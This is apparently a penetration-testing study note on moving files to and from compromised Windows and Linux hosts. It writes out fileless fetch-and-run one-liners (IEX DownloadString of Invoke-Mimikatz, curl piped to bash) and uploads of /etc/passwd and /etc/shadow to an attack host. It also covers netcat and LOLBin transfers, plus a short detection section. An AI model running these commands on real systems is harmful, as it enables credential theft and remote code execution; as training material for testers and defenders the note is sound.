# File Transfer

During penetration testing, it's crucial to understand different methods to transfer files between systems. Network controls like **firewalls**, **application whitelisting**, and **antivirus/EDR** systems can block certain actions, making it important to have multiple techniques at your disposal.

### Scenario

- **Initial Access**: We gained remote code execution (RCE) on an IIS web server through an unrestricted file upload vulnerability.
- **Web Shell to Reverse Shell**: After uploading a web shell, we switched to a reverse shell for better control.
- **Privilege Escalation**: We manually enumerated the system and found that we had `SeImpersonatePrivilege`.
- **Blocked Transfers**: We couldn't use PowerShell or download tools from GitHub due to **content filtering**.
- **File Transfer Options**:
  1. **Certutil**: Blocked by web filters.
  2. **FTP**: Blocked by firewall (port 21).
  3. **SMB**: Allowed through port 445, and successfully used with `smbserver` to transfer files.

### Key Points

- **Host Controls**: Restrictions like application whitelisting or AV may block tools such as PowerShell or FTP.
- **Network Controls**: Firewalls may block common file transfer ports, like 21 (FTP) or 80/443 (HTTP/HTTPS).

### File Transfer Methods

- **Certutil**: Windows tool, often blocked by content filtering.
- **FTP**: Standard file transfer protocol, but may be blocked by firewalls.
- **SMB**: Works on port 445, can be useful when FTP is blocked.
- **Impacket Tools**: Useful for SMB and other file-sharing methods.

# Windows file transfer methods

The Windows operating system has evolved with new utilities for file transfer operations, which are crucial for both attackers and defenders. Attackers use various methods to transfer files and avoid detection, while defenders need to understand these methods to monitor and create policies to prevent compromises. The Microsoft Astaroth Attack blog post is a prime example of an advanced persistent threat (APT). Fileless threats, as discussed in the blog, use legitimate system tools to execute attacks without leaving traditional file traces. In the Astaroth attack, a spear-phishing email with a malicious link led to an LNK file. When executed, this LNK file used the WMIC tool with the “/Format” parameter to download and run malicious JavaScript code, which then downloaded payloads using the Bitsadmin tool. These payloads were base64-encoded and decoded with the Certutil tool, resulting in DLL files. The regsvr32 tool loaded one of these DLLs, which decrypted and loaded additional files until the final payload, Astaroth, was injected into the Userinit process.

## Download Operations

### PowerShell Base64 Encode & Decode
__Check SSH Key MD5 Hash__
```
 md5sum id_rsa
```
__Encode SSH Key to Base64__
```
cat id_rsa |base64 -w 0;echo
```
we copy the output and paste into powershell in target machine and decode it
```
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("G1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
we confirm the tranfer by comparing the hashes 
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## PowerShell Web Downloads

Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe)

PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. 
![image](https://github.com/user-attachments/assets/4baaa31a-5b4e-4513-bafc-fc2ea19c3c2b)

__PowerShell DownloadFile Method__
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
__PowerShell DownloadString - Fileless Method__
PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
IEX pipeline input
```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

__PowerShell Invoke-WebRequest__
From powershell 3.0 you can use Invoke-WebRequest but is slower. Use iwr,cur,and wget.
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
This can be bypassed using the parameter -UseBasicParsing.
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
__If certificate is not trusted related to SSL/TLS.__
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
```
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
__SMB server setup__
```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
To download file from SMB server 
```
C:\htb> copy \\192.168.220.133\share\nc.exe
```
New versions of windows block unauthenticated access use this instead
use a user and password server
```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
__Mount the SMB Server with Username and Password__
```
C:\htb> net use n: \\192.168.220.133\share /user:test test
C:\htb> copy n:\nc.exe
```
### FTP Downloads
FTP client or PowerShell Net.WebClient to download files from an FTP server.
__Install pyftpdlib__
```
sudo pip3 install pyftpdlib
```
__Setup__
```
sudo python3 -m pyftpdlib --port 21
```
__Transfer files__
```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
If the shell is non interactive use the methods below
Create a Command File for the FTP Client and Download the Target File
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```
## Upload Operations
There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host.

### PowerShell Base64 Encode & Decode
__Encode File Using PowerShell__
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
Copy the output and get the hash as well. For comparison later on.
```
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

__Decode Base64 on linux__

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDU | base64 -d > hosts
```
compare hash
```
md5sum hosts
```
### Powershell web uploads
 use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We need webserver to upload it to.
 __Install web server__
```
pip3 install uploadserver
python3 -m uploadserver
```
Use PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file.
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
__PowerShell Base64 Web Upload__
PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

We catch the webrequest and decode the base64 and convert it into file 
```
nc -lvnp 8000
```
```
echo <base64> | base64 -d -w 0 > hosts
```

### SMB uploads
Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.

An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.

__Install WebDav__
```
sudo pip3 install wsgidav cheroot
```
__Using webdav__
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
__Connect to webdav share__
```
C:\htb> dir \\192.168.49.128\DavWWWRoot
```
__DavWWWRoot__ is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
__Uploading to SMB__
```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

### FTP Uploads
Setup FTP  server with (--write) to allow clients to upload files.
```
sudo python3 -m pyftpdlib --port 21 --write
```
__Use powershell to upload file__
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
__Create a Command File for the FTP Client to Upload a File__
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
# Linux Transfer Methods
Linux offers various tools for file transfers, which are crucial for both attackers and defenders. During an incident response, we found threat actors exploiting a SQL Injection vulnerability on web servers. They used a Bash script to download malware via three methods: cURL, wget, and Python, all using HTTP. While Linux supports FTP and SMB, most malware uses HTTP/HTTPS. Understanding these methods helps in both attacking and defending networks. This section covers file transfer methods in Linux, including HTTP, Bash, and SSH.

## Download Operations

### Base64 Encoding / Decoding

__Check file MD5 hash__
```
md5sum id_rsa
```
cat to print the file content, and base64 encode the output using a pipe |. We used the option -w 0 to create only one line. echo keyword to start a new line and make it easier to copy.

__Encode SSH key to Base64__
```
cat id_rsa |base64 -w 0;echo
```
copy this base64 paste it into the target and decode it and pipe it into a file
```
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNH' | base64 -d > id_rsa
```
compare the files hashes to see if the transfer were correct
```
md5sum id_rsa
```
### Web Downloads with Wget and cURL

Wget and cURL are utilities to interact with web applications and is installed on so many linux distros

__Download file using wget__
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # -O set output filename
```
__Download a File Using cURL__
```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # -o output file
```
### Fileless Attacks Using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
![image](https://github.com/user-attachments/assets/5867d7ef-f889-4614-bbf2-9c4fc7a6516e)

__Fileless Download with cURL__

use curl command and directly execute it using pipe
```
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

__Fileless Download with wget__

Python script file from a web server and pipe it into the Python binary
```
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```
### Download with Bash (/dev/tcp)

When no well known file transfer tools are available use these.(__BASH__ version 2.04)

__Connect to the target Webserver__ 
```
exec 3<>/dev/tcp/10.10.10.32/80
```
__HTTP GET Request__
```
 echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
__Print Response__
```
cat <&3
```

### SSH Downloads
SSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.

__Enabling the SSH Server__
```
sudo systemctl enable ssh
```
__Starting the SSH Server__
```
sudo systemctl start ssh
```
__Checking for SSH Listening Port__
```
netstat -lnpt
```
__Linux - Downloading Files Using SCP__
```
scp plaintext@192.168.49.128:/root/myroot.txt .
```
Better to create a new account and use that as tmp user for the above command. Due to security reasons.

## Upload Operations

### Web Upload
Use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page.

__Pwnbox - Start Web Server__
```
sudo python3 -m pip install --user uploadserver
```
Now we need to create a certificate. In this example, we are using a self-signed certificate.

__Pwnbox - Create a Self-Signed Certificate__
```
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
The webserver should not host the certificate. Create a new directory to host the file for our webserver.

__Pwnbox - Start Web Server__
  
```
mkdir https && cd https
```
```
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
The target machine will upload to this server
```
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure # option --insecure because we used a self-signed certificate that we trust.
```
### Alternative Web File Transfer Method

Linux distributions usually have Python or php installed.
 
__Linux - Creating a Web Server with Python3__
```
python3 -m http.server
```
__Linux - Creating a Web Server with Python2.7__
```
python2.7 -m SimpleHTTPServer
```
__Linux - Creating a Web Server with PHP__
```
php -S 0.0.0.0:8000
```
__Linux - Creating a Web Server with Ruby__
```
ruby -run -ehttpd . -p8000
```
__Download the File from the Target Machine onto the Pwnbox__
```
wget 192.168.49.128:8000/filetotransfer.txt
```
Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.

### SCP Upload
__File Upload using SCP__
```
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Transferring Files with Code

## Python
__Python 2 - Download__ 

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
__Python 3 - Download__
```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
## PHP
PHP is used by 77.4% of all websites with a known server-side programming language.
__PHP Download with File_get_contents()__
```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
__PHP Download with Fopen()__
```
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
__PHP Download a File and Pipe it to Bash__ 
```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
## Other Languages
__Ruby - Download a File__
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
__Perl - Download a File__
```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
## JavaScript
JavaScript is a scripting or programming language that allows you to implement complex features on web pages. 
The following JavaScript code is based on this post, and we can download a file using it. Create wget.js

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
```
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
## VBScript
VBScript ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. 

The following VBScript example can be used based on this. We'll create a file called wget.vbs
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
```
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```
## Upload Operations using Python3

__Starting the Python uploadserver Module__
```
python3 -m uploadserver
```
__Uploading a File Using a Python One-liner__
```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
# Miscellaneous File Transfer Methods

## File Transfer with Netcat and Ncat

### Netcat (Original) on Compromised Machine
**Command:**
```bash
nc -l -p 8000 > SharpKatz.exe
```
Explanation:
This command starts Netcat in listen mode (-l) on port 8000 (-p 8000) and redirects any data received to a file named SharpKatz.exe. This makes the compromised machine ready to receive the file.

### Ncat on Compromised Machine
Command:
```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```
Explanation:
Similar to the Netcat command, this starts Ncat in listen mode on port 8000. The --recv-only flag ensures that Ncat will close the connection after receiving the file, making it more efficient for single-file transfers.
### Netcat (Original) on Attack Host

```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
Explanation:
wget downloads the file SharpKatz.exe from a remote URL.
nc -q 0 connects to the compromised machine at IP 192.168.49.128 on port 8000. The -q 0 option ensures Netcat will quit immediately after sending the file.

### Ncat on Attack Host
```
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
Explanation:

wget downloads the file as before.
ncat --send-only sends the file to the compromised machine. --send-only ensures Ncat will terminate after sending the file, avoiding any additional data transmission.
### Netcat (Original) on Attack Host (Listen on Port 443)
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
Explanation:

sudo is used to gain necessary permissions for listening on port 443 (a privileged port).
nc -l -p 443 -q 0 listens on port 443 and sends the file SharpKatz.exe to any connecting client. The -q 0 option ensures the connection closes immediately after the file is sent.

### Ncat on Attack Host (Listen on Port 443)
```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
### Netcat (Original) on Compromised Machine (Connect to Attack Host)
```
nc 192.168.49.128 443 > SharpKatz.exe
```

### Ncat on Compromised Machine (Connect to Attack Host)
```
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```
Explanation:
Similar to the Netcat command but using Ncat with --recv-only to ensure it closes the connection after the file transfer is complete.

### Bash /dev/tcp File Transfer (Compromised Machine Connecting to Netcat)
```
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
Explanation:
This uses Bash’s /dev/tcp pseudo-device to open a TCP connection to the attack host and writes the received data into SharpKatz.exe.

## PowerShell Session File Transfer

### Confirm WinRM Port TCP 5985 is Open on DATABASE01
```
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
Checks if the WinRM port (5985 for HTTP) is open and accessible on DATABASE01. This verifies if PowerShell Remoting is possible.

### Create a PowerShell Remoting Session to DATABASE01
```
Create a PowerShell Remoting Session to DATABASE01
```
Explanation:
Establishes a PowerShell Remoting session to DATABASE01 and stores the session object in the $Session variablw

### Copy File from Localhost to DATABASE01 Session
```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
Explanation:
Copies samplefile.txt from the local machine to the DATABASE01 remote session, placing it on the Desktop of the Administrator user.

### Copy File from DATABASE01 Session to Localhost
```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP File Transfer
Mounting a Linux Folder Using rdesktop
```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
Explanation:
Uses rdesktop to mount a local Linux directory (/home/user/rdesktop/files) on the remote RDP session, making the local files accessible from the remote Windows environment.

### Mounting a Linux Folder Using xfreerdp
```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```
Explanation:
Uses xfreerdp to mount a local folder (/home/plaintext/htb/academy/filetransfer) on the remote RDP session, similarly allowing file transfers.

### Accessing the Directory
To access the mounted directory in the RDP session, navigate to:
```
\\tsclient\
```
This will show the local directories mounted via rdesktop or xfreerdp, allowing file transfers between the local and remote systems.

# Protected File Transfers

Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.

## File Encryption on Windows
__Invoke-AESEncryption.ps1 PowerShell script__

```
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
```
__Import Module Invoke-AESEncryption.ps1__ 
```
Import-Module .\Invoke-AESEncryption.ps1
```
__File Encryption Example__ 
```
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
ls
```
Using very strong and unique passwords for encryption for every company where a penetration test is performed is essential.

## File Encryption on Linux
To encrypt a file using openssl we can select different ciphers, see OpenSSL man page. Let's use -aes256 as an example. We can also override the default iterations counts with the option -iter 100000 and add the option -pbkdf2 to use the Password-Based Key Derivation Function 2 algorithm.

__Encrypting /etc/passwd with openssl__
```
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```
__Decrypt passwd.enc with openssl__
```
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

# Catching Files over HTTP/S

## HTTP/S
Web transfer is the most common way most people transfer files because HTTP/HTTPS are the most common protocols allowed through firewalls. 

### Nginx - Enabling PUT
A good alternative for transferring files to Apache is Nginx because the configuration is less complicated, and the module system does not lead to security issues as Apache can.
__Create a Directory to Handle Uploaded Files__
```
 sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
__Change the Owner to www-data_
```
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
__Create Nginx Configuration File__ 
Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:
```
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```
__Symlink our Site to the sites-enabled Directory__
```
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
__Start Nginx__ 
```
sudo systemctl restart nginx.service
```
If we get any error messages, check /var/log/nginx/error.log. 

__Verifying Errors__ 
```
tail -2 /var/log/nginx/error.log
```
find what is running on port 80
```
ss -lnpt | grep 80
```

Find process id 2811
```
ps -ef | grep 2811
```
__Remove NginxDefault Configuration__
```
sudo rm /etc/nginx/sites-enabled/default
```
Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt
__Upload File Using cURL__
```
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
```
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```
By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. nginx hides list all files features. Nginx being minimal, features like that are not enabled by default.

# Living off The Land
The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that 
an attacker can use to perform actions beyond their original purpose. 

## Using the LOLBAS and GTFOBins Project

### LOLBAS
To search for download and upload functions in LOLBAS we can use /download or /upload.
Let's use CertReq.exe as an example.

__Upload win.ini to our Pwnbox__ 
```
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
````
__File Received in our Netcat Session__
```
sudo nc -lvnp 8000
```
If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter.

### GTFOBins
To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.
Let's use OpenSSL. It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks.

__Create Certificate in our Pwnbox__
```
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```
__Stand up the Server in our Pwnbox__ 
```
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
__Download File from the Compromised Machine__
```
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
### Other Common Living off the Land tools
The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It checks host and network utilization into account to minimize the impact on a user's foreground work.
```
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
PowerShell also enables interaction with BITS enables file downloads and uploads, supports credentials, and can use specified proxy servers.
```
 Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
 ```
### Certutil
Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. Antimalware Scan Interface (AMSI) currently detects if used in malicious way.

__Download a File with Certutil__
```
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
# Detection

Command-line detection using blacklisting can be easily bypassed, but whitelisting command lines is more robust, allowing for quicker detection of unusual activity. In client-server protocols, especially HTTP, the client and server negotiate how content is delivered. The HTTP client is identified by its user agent string (e.g., Firefox, Chrome, cURL). Organizations can compile lists of known legitimate user agents, such as those used by default OS processes or update services, and feed them into a SIEM tool for threat hunting. Suspicious user agents can then be investigated for potential malicious actions, including file transfers.

__Invoke-WebRequest - Client__
```
Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
```
```
Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```
__Invoke-WebRequest - Server__ 
![image](https://github.com/user-attachments/assets/23b6f990-2405-49f3-85d3-8f89443a4615)

__WinHttpRequest - Client__ 
```
$h=new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.ResponseText
```
__WinHttpRequest - Server__ 
![image](https://github.com/user-attachments/assets/b2e516b8-62d0-420a-bb4f-f7bb8d100f1c)

__Msxml2 - Client__ 
```
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://10.10.10.32/nc.exe',$false);
$h.send();
iex $h.responseText
```
__Msxml2 - Server__
![image](https://github.com/user-attachments/assets/5f25bdfa-057c-4845-924b-e7afba210f21)

__Certutil - Client__ 
```
certutil -urlcache -split -f http://10.10.10.32/nc.exe 
certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```
![image](https://github.com/user-attachments/assets/ad69271f-0205-489f-99ce-24190edd3242)

